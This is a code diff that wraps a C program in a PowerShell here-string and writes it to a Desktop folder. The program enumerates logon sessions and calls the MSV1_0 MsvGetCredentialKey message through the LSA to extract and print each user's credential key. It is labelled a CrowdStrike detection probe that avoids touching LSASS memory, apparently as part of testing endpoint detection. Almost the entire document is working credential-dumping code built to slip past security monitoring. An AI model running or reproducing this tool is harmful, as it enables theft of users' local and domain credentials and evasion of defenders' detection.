@@ -1,47 +1,14 @@
+$code = @'
 #include <windows.h>
 #include <stdio.h>
-
-/* All types defined AFTER windows.h so UNICODE_STRING etc are available */
-
 #ifndef STATUS_SUCCESS
 #define STATUS_SUCCESS ((LONG)0x00000000L)
 #endif
-
 typedef LONG NTSTATUS;
-
-typedef struct {
-    USHORT Length;
-    USHORT MaximumLength;
-    PCHAR  Buffer;
-} MY_LSA_STRING;
-
-typedef struct {
-    ULONG               Size;
-    LUID                LogonId;
-    UNICODE_STRING      UserName;
-    UNICODE_STRING      LogonDomain;
-    UNICODE_STRING      AuthenticationPackage;
-    ULONG               LogonType;
-    ULONG               Session;
-    PSID                Sid;
-    LARGE_INTEGER       LogonTime;
-    UNICODE_STRING      LogonServer;
-    UNICODE_STRING      DnsDomainName;
-    UNICODE_STRING      Upn;
-} MY_SESSION_DATA;
-
-typedef struct {
-    ULONG MessageType;
-    LUID  LogonId;
-} CREDKEY_REQUEST;
-
-typedef struct {
-    ULONG MessageType;
-    ULONG KeyType;
-    UCHAR Key[20];
-} CREDKEY_RESPONSE;
-
-/* Function pointer types */
+typedef struct { USHORT Length; USHORT MaximumLength; PCHAR Buffer; } MY_LSA_STRING;
+typedef struct { ULONG Size; LUID LogonId; UNICODE_STRING UserName; UNICODE_STRING LogonDomain; UNICODE_STRING AuthenticationPackage; ULONG LogonType; ULONG Session; PSID Sid; LARGE_INTEGER LogonTime; UNICODE_STRING LogonServer; UNICODE_STRING DnsDomainName; UNICODE_STRING Upn; } MY_SESSION_DATA;
+typedef struct { ULONG MessageType; LUID LogonId; } CREDKEY_REQUEST;
+typedef struct { ULONG MessageType; ULONG KeyType; UCHAR Key[20]; } CREDKEY_RESPONSE;
 typedef NTSTATUS (WINAPI *fn_Register)(MY_LSA_STRING*, PHANDLE, PULONG);
 typedef NTSTATUS (WINAPI *fn_Lookup)(HANDLE, MY_LSA_STRING*, PULONG);
 typedef NTSTATUS (WINAPI *fn_Call)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
@@ -49,142 +16,74 @@ typedef NTSTATUS (WINAPI *fn_Free)(PVOID);
 typedef NTSTATUS (WINAPI *fn_Enumerate)(PULONG, PLUID*);
 typedef NTSTATUS (WINAPI *fn_GetData)(PLUID, MY_SESSION_DATA**);
 typedef NTSTATUS (WINAPI *fn_Deregister)(HANDLE);
-
-static fn_Register   _Register   = NULL;
-static fn_Lookup     _Lookup     = NULL;
-static fn_Call       _Call       = NULL;
-static fn_Free       _Free       = NULL;
-static fn_Enumerate  _Enumerate  = NULL;
-static fn_GetData    _GetData    = NULL;
-static fn_Deregister _Deregister = NULL;
-
-static int LoadFunctions(void) {
-    HMODULE h = LoadLibraryA("secur32.dll");
-    if (!h) { printf("[-] Cannot load secur32.dll\n"); return 0; }
-    _Register   = (fn_Register)  GetProcAddress(h, "LsaRegisterLogonProcess");
-    _Lookup     = (fn_Lookup)    GetProcAddress(h, "LsaLookupAuthenticationPackage");
-    _Call       = (fn_Call)      GetProcAddress(h, "LsaCallAuthenticationPackage");
-    _Free       = (fn_Free)      GetProcAddress(h, "LsaFreeReturnBuffer");
-    _Enumerate  = (fn_Enumerate) GetProcAddress(h, "LsaEnumerateLogonSessions");
-    _GetData    = (fn_GetData)   GetProcAddress(h, "LsaGetLogonSessionData");
-    _Deregister = (fn_Deregister)GetProcAddress(h, "LsaDeregisterLogonProcess");
-    if (!_Register||!_Lookup||!_Call||!_Free||!_Enumerate||!_GetData||!_Deregister) {
-        printf("[-] Failed to resolve functions\n"); return 0;
-    }
-    printf("[+] secur32.dll loaded OK\n");
-    return 1;
-}
-
-static void InitStr(MY_LSA_STRING *s, char *b) {
-    s->Buffer = b;
-    s->Length = (USHORT)strlen(b);
-    s->MaximumLength = s->Length + 1;
-}
-
-static void PrintHex(const char *label, UCHAR *data, ULONG len) {
-    printf("    [+] %s: ", label);
-    for (ULONG i = 0; i < len; i++) printf("%02X", data[i]);
-    printf("\n");
-}
-
-static int RunTest(LUID luid) {
-    HANDLE     h       = NULL;
-    ULONG      pkg     = 0;
-    NTSTATUS   st      = 0;
-    NTSTATUS   sub     = 0;
-    MY_LSA_STRING proc, name;
-    CREDKEY_REQUEST  req;
-    CREDKEY_RESPONSE *resp = NULL;
-    ULONG respLen = 0;
-
-    /* STEP 1 - Register as LSA client (fires Event ID 4611) */
-    InitStr(&proc, "svcgaptest");
+static fn_Register _R=NULL; static fn_Lookup _L=NULL; static fn_Call _C=NULL;
+static fn_Free _F=NULL; static fn_Enumerate _E=NULL; static fn_GetData _G=NULL; static fn_Deregister _D=NULL;
+static void InitStr(MY_LSA_STRING *s,char *b){s->Buffer=b;s->Length=(USHORT)strlen(b);s->MaximumLength=s->Length+1;}
+static void Hex(UCHAR *d,ULONG l){for(ULONG i=0;i<l;i++)printf("%02X",d[i]);printf("\n");}
+static int Run(LUID luid){
+    HANDLE h=NULL; ULONG pkg=0; NTSTATUS st=0,sub=0; MY_LSA_STRING p,n;
+    CREDKEY_REQUEST req; CREDKEY_RESPONSE *resp=NULL; ULONG rl=0;
+    InitStr(&p,"svcgaptest");
     printf("\n[*] STEP 1: LsaRegisterLogonProcess\n");
-    st = _Register(&proc, &h, NULL);
-    if (st != STATUS_SUCCESS) {
-        printf("[-] FAILED 0x%08X - run as Administrator\n", (unsigned)st);
-        return 1;
-    }
-    printf("    [+] OK  handle=%p\n", h);
-
-    /* STEP 2 - Resolve MSV1_0 package ID */
-    InitStr(&name, "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");
+    st=_R(&p,&h,NULL);
+    if(st!=STATUS_SUCCESS){printf("[-] FAILED 0x%08X - need Administrator\n",(unsigned)st);return 1;}
+    printf("    [+] OK handle=%p\n",h);
+    InitStr(&n,"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");
     printf("[*] STEP 2: LsaLookupAuthenticationPackage\n");
-    st = _Lookup(h, &name, &pkg);
-    if (st != STATUS_SUCCESS) {
-        printf("[-] FAILED 0x%08X\n", (unsigned)st);
-        _Deregister(h); return 1;
-    }
-    printf("    [+] OK  package_id=%lu\n", pkg);
-
-    /* STEP 3 - MsvGetCredentialKey (0x37) — same call as LSAWhisper-BOF */
-    memset(&req, 0, sizeof(req));
-    req.MessageType = 0x37;
-    req.LogonId = luid;
-
-    printf("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)\n");
-    printf("    LUID: 0x%08X:0x%08X\n", (unsigned)luid.HighPart, (unsigned)luid.LowPart);
-
-    st = _Call(h, pkg, &req, sizeof(req), (PVOID*)&resp, &respLen, &sub);
-
-    if (st != STATUS_SUCCESS)
-        printf("[-] Outer FAILED: 0x%08X\n", (unsigned)st);
-    else if (sub != STATUS_SUCCESS)
-        printf("[-] Inner FAILED: 0x%08X (bad LUID?)\n", (unsigned)sub);
-    else {
-        printf("    [+] OK  %lu bytes\n", respLen);
-        if (resp && respLen >= sizeof(CREDKEY_RESPONSE)) {
-            printf("\n    === CREDENTIAL KEY EXTRACTED ===\n");
-            PrintHex("Key", resp->Key, 20);
-            printf("    KeyType: %lu (1=Local 2=Domain)\n", resp->KeyType);
-            printf("    ================================\n");
+    st=_L(h,&n,&pkg);
+    if(st!=STATUS_SUCCESS){printf("[-] FAILED 0x%08X\n",(unsigned)st);_D(h);return 1;}
+    printf("    [+] OK pkg=%lu\n",pkg);
+    memset(&req,0,sizeof(req)); req.MessageType=0x37; req.LogonId=luid;
+    printf("[*] STEP 3: LsaCallAuthenticationPackage (0x37 MsvGetCredentialKey)\n");
+    printf("    LUID: 0x%X:0x%X\n",(unsigned)luid.HighPart,(unsigned)luid.LowPart);
+    st=_C(h,pkg,&req,sizeof(req),(PVOID*)&resp,&rl,&sub);
+    if(st!=STATUS_SUCCESS) printf("[-] Outer FAILED 0x%08X\n",(unsigned)st);
+    else if(sub!=STATUS_SUCCESS) printf("[-] Inner FAILED 0x%08X (bad LUID?)\n",(unsigned)sub);
+    else{
+        printf("    [+] OK %lu bytes\n",rl);
+        if(resp&&rl>=sizeof(CREDKEY_RESPONSE)){
+            printf("    === CREDENTIAL KEY ===\n    ");
+            Hex(resp->Key,20);
+            printf("    KeyType=%lu (1=Local 2=Domain)\n",resp->KeyType);
         }
-        if (resp) _Free(resp);
+        if(resp)_F(resp);
     }
-
-    _Deregister(h);
-    return (st == STATUS_SUCCESS && sub == STATUS_SUCCESS) ? 0 : 2;
+    _D(h);
+    return(st==STATUS_SUCCESS&&sub==STATUS_SUCCESS)?0:2;
 }
-
-static void RunAll(void) {
-    ULONG count = 0;
-    PLUID sessions = NULL;
-    printf("[*] Enumerating sessions...\n");
-    if (_Enumerate(&count, &sessions) != STATUS_SUCCESS) {
-        printf("[-] Enumerate failed\n"); return;
-    }
-    printf("[*] %lu sessions found\n", count);
-    for (ULONG i = 0; i < count; i++) {
-        MY_SESSION_DATA *d = NULL;
-        if (_GetData(&sessions[i], &d) == STATUS_SUCCESS && d) {
-            if (d->LogonType == 2 || d->LogonType == 3 || d->LogonType == 5) {
-                printf("\n--- Session %lu  LUID=0x%X  Type=%lu ---\n",
-                    i+1, (unsigned)sessions[i].LowPart, d->LogonType);
-                if (d->UserName.Buffer)
-                    printf("    User: %S\\%S\n", d->LogonDomain.Buffer, d->UserName.Buffer);
-                RunTest(sessions[i]);
+static void RunAll(void){
+    ULONG count=0; PLUID s=NULL;
+    if(_E(&count,&s)!=STATUS_SUCCESS){printf("[-] Enumerate failed\n");return;}
+    printf("[*] %lu sessions\n",count);
+    for(ULONG i=0;i<count;i++){
+        MY_SESSION_DATA *d=NULL;
+        if(_G(&s[i],&d)==STATUS_SUCCESS&&d){
+            if(d->LogonType==2||d->LogonType==3||d->LogonType==5){
+                printf("\n--- Session %lu LUID=0x%X Type=%lu ---\n",i+1,(unsigned)s[i].LowPart,d->LogonType);
+                if(d->UserName.Buffer)printf("    %S\\%S\n",d->LogonDomain.Buffer,d->UserName.Buffer);
+                Run(s[i]);
             }
-            _Free(d);
+            _F(d);
         }
     }
-    _Free(sessions);
+    _F(s);
 }
-
-int main(int argc, char *argv[]) {
-    printf("================================================\n");
-    printf("  LSA Gap Test - CrowdStrike Detection Probe\n");
-    printf("  No LSASS handle. No memory read. No DLL.\n");
-    printf("================================================\n");
-
-    if (!LoadFunctions()) return 1;
-
-    if (argc == 2) {
-        LUID luid = {0};
-        unsigned long long raw = strtoull(argv[1], NULL, 0);
-        luid.LowPart  = (ULONG)(raw & 0xFFFFFFFF);
-        luid.HighPart = (LONG)((raw >> 32) & 0xFFFFFFFF);
-        return RunTest(luid);
-    }
-    RunAll();
-    return 0;
+int main(int argc,char *argv[]){
+    printf("=== LSA Gap Test - CrowdStrike Detection Probe ===\n");
+    HMODULE h=LoadLibraryA("secur32.dll");
+    if(!h){printf("[-] secur32.dll load failed\n");return 1;}
+    _R=(fn_Register)GetProcAddress(h,"LsaRegisterLogonProcess");
+    _L=(fn_Lookup)GetProcAddress(h,"LsaLookupAuthenticationPackage");
+    _C=(fn_Call)GetProcAddress(h,"LsaCallAuthenticationPackage");
+    _F=(fn_Free)GetProcAddress(h,"LsaFreeReturnBuffer");
+    _E=(fn_Enumerate)GetProcAddress(h,"LsaEnumerateLogonSessions");
+    _G=(fn_GetData)GetProcAddress(h,"LsaGetLogonSessionData");
+    _D=(fn_Deregister)GetProcAddress(h,"LsaDeregisterLogonProcess");
+    if(!_R||!_L||!_C||!_F||!_E||!_G||!_D){printf("[-] resolve failed\n");return 1;}
+    printf("[+] Functions loaded\n");
+    if(argc==2){LUID l={0};unsigned long long r=strtoull(argv[1],NULL,0);l.LowPart=(ULONG)(r&0xFFFFFFFF);l.HighPart=(LONG)((r>>32)&0xFFFFFFFF);return Run(l);}
+    RunAll(); return 0;
 }
+'@
+$code | Out-File -Encoding ASCII -FilePath "C:\Users\nvegireddi\Desktop\LSA_test\lsa_gap_test.c"
+Write-Host "File written"
